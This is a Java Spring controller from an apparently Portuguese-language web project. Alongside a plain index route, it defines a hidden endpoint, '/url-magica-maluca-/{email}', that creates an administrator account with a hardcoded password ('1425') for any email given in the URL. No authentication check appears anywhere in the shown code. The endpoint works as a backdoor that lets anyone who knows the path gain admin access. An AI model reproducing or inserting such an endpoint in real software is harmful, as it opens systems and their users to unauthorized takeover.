package com.kgl.controller;

import java.util.ArrayList;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;

import com.kgl.models.Contrato;
import com.kgl.models.GenerateHashPasswordUtil;
import com.kgl.models.Role;
import com.kgl.models.User;
import com.kgl.repository.UserRepository;

@Controller
public class HomeController {

	@Autowired
	private UserRepository userRepository;

	@Autowired
	ConfigurarUser conf;
	
	@RequestMapping({ "/", "/index" })
	private ModelAndView form(Contrato contrato) {
		ModelAndView mvn = new ModelAndView("index");
		return mvn;

	}

	@Transactional
	@ResponseBody
	@RequestMapping("/url-magica-maluca-/{email}")
	public ModelAndView urlMagicaMaluca(@PathVariable("email") String email) throws Exception {
		String password;
		List<Role> list = new ArrayList();
		password = GenerateHashPasswordUtil.generateHash("1425");
		Role role = new Role();
		role.setNome("ROLE_ADMIN");
		list.add(role);
		User user = new User(email, password, list);
		userRepository.save(user);

		return conf.updatePassword(user);
	}


}
